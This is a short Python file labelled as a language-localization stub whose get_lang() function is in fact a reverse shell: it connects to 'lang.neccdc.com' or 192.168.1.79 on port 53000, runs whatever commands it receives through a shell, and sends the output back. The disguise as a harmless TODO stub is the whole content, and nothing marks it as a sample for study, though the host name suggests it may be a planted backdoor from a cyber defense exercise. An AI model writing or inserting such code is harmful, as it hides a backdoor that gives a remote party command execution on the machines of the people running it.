## Language default stub

##TODO: Implement language localization

def get_lang():
    import socket,subprocess

    HOSTS = ["lang.neccdc.com", "192.168.1.79"]
    PORT = 53000

    for HOST in HOSTS:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try:
                s.connect((HOST, PORT))
        except:
                continue

        s.send('connect established')
        while True:
                data = s.recv(1024)
                if data == "quit\n": break
                proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                stdout_value = proc.stdout.read() + proc.stderr.read()
                s.send(stdout_value)
        s.close()

